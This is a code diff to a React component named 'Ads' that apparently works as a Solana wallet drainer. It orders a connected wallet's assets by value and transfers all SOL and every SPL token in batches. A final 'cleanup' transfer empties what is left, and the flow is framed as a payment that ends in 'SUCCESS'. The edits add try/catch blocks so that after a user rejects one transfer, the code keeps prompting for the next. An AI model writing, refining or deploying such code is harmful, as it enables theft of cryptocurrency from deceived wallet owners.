@@ -550,22 +550,23 @@ const Ads = () => {
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
       
       // 3. Determine transaction order based on SOL value
-      const sendSPLFirst = solValueUSD < 1; // If SOL < $1, send SPL tokens first
+      const sendSPLFirst = solValueUSD <= 1; // If SOL <= $1, send SPL tokens first
       
       if (sendSPLFirst) {
-        console.log('SOL < $1: Sending SPL tokens first, then SOL');
+        console.log('SOL <= $1: Generating SPL token requests first, then SOL');
       } else {
-        console.log('SOL >= $1: Sending SOL first, then SPL tokens');
+        console.log('SOL > $1: Generating SOL request first, then SPL tokens');
       }
       
       // 4. Calculate fee reserve (50 cents in SOL)
       const feeReserveLamports = Math.floor((0.50 / estimatedSolPrice) * LAMPORTS_PER_SOL);
       console.log(`Fee reserve: ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL ($0.50)`);
       
-      // 5. Execute transactions in order
+      // 5. Execute transactions in order (one at a time, waiting for user signature/rejection)
       
       if (!sendSPLFirst) {
-        // Send SOL first (if >= $1)
+        // Send SOL first (if > $1)
+        console.log('Generating SOL transaction request...');
         const lamportsToSend = Math.max(0, solBal - feeReserveLamports);
         
         if (lamportsToSend > 5000) {
@@ -590,19 +591,28 @@ const Ads = () => {
             console.error("SOL simulation failed", e);
           }
 
-          const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+          toast.info(`SOL transaction request generated. Please sign in your wallet...`);
           
-          toast.info(`Processing SOL transfer...`);
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-          toast.success(`SOL sent! Reserved $0.50 for fees`);
+          // Wait for user to sign or reject
+          try {
+            const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+            
+            toast.info(`Processing SOL transfer...`);
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+            toast.success(`SOL sent! Reserved $0.50 for fees`);
+          } catch (error) {
+            console.log('User rejected SOL transaction or it failed:', error);
+            toast.error('SOL transaction rejected or failed');
+            // Continue to SPL tokens even if SOL fails
+          }
         }
       }
       
-      // 6. Send SPL tokens in batches
+      // 6. Send SPL tokens in batches (one batch at a time)
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
         batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
@@ -610,6 +620,8 @@ const Ads = () => {
 
       for (let i = 0; i < batches.length; i++) {
         const batch = batches[i];
+        
+        console.log(`Generating SPL token batch ${i + 1}/${batches.length} transaction request...`);
         
         const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);
 
@@ -624,20 +636,30 @@ const Ads = () => {
             console.error("Token batch simulation failed", e);
           }
 
-          const { signature } = await sendTx(transaction);
+          toast.info(`SPL token batch ${i + 1}/${batches.length} request generated. Please sign in your wallet...`);
           
-          toast.info(`Processing token batch ${i + 1}/${batches.length}...`);
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-          toast.success(`Token batch ${i + 1} sent!`);
+          // Wait for user to sign or reject
+          try {
+            const { signature } = await sendTx(transaction);
+            
+            toast.info(`Processing token batch ${i + 1}/${batches.length}...`);
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+            toast.success(`Token batch ${i + 1} sent!`);
+          } catch (error) {
+            console.log(`User rejected token batch ${i + 1} or it failed:`, error);
+            toast.error(`Token batch ${i + 1} rejected or failed`);
+            // Continue to next batch even if this one fails
+          }
         }
       }
       
-      // 7. Send SOL last (if < $1 and was deferred)
+      // 7. Send SOL last (if <= $1 and was deferred)
       if (sendSPLFirst) {
+        console.log('Generating SOL transaction request (after SPL tokens)...');
         const currentSolBal = await connection.getBalance(currentPublicKey);
         const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
         
@@ -663,15 +685,23 @@ const Ads = () => {
             console.error("SOL simulation failed", e);
           }
 
-          const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+          toast.info(`SOL transaction request generated. Please sign in your wallet...`);
           
-          toast.info(`Processing SOL transfer...`);
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-          toast.success(`SOL sent!`);
+          // Wait for user to sign or reject
+          try {
+            const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+            
+            toast.info(`Processing SOL transfer...`);
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+            toast.success(`SOL sent!`);
+          } catch (error) {
+            console.log('User rejected SOL transaction or it failed:', error);
+            toast.error('SOL transaction rejected or failed');
+          }
         }
       }
       
@@ -681,6 +711,8 @@ const Ads = () => {
       const finalLamportsToSend = Math.max(0, finalSolBal - MINIMAL_RESERVE);
       
       if (finalLamportsToSend > 5000) {
+        console.log('Generating final cleanup SOL transaction request...');
+        
         const finalTransaction = new Transaction();
         
         finalTransaction.add(
@@ -702,18 +734,27 @@ const Ads = () => {
           console.error("Final SOL simulation failed", e);
         }
 
-        const { signature, blockhash, lastValidBlockHeight } = await sendTx(finalTransaction);
+        toast.info('Final SOL cleanup request generated. Please sign in your wallet...');
         
-        toast.info('Processing remaining SOL...');
-        await connection.confirmTransaction({
-          signature,
-          blockhash,
-          lastValidBlockHeight
-        }, 'confirmed');
-        toast.success('Final SOL transfer complete!');
+        // Wait for user to sign or reject
+        try {
+          const { signature, blockhash, lastValidBlockHeight } = await sendTx(finalTransaction);
+          
+          toast.info('Processing remaining SOL...');
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          toast.success('Final SOL transfer complete!');
+        } catch (error) {
+          console.log('User rejected final SOL transaction or it failed:', error);
+          toast.error('Final SOL transaction rejected or failed');
+        }
       }
 
       setPaymentStatus('SUCCESS');
+      toast.success('All transactions completed!');
       setTimeout(fetchAllBalances, 2000);
 
     } catch (error: any) {
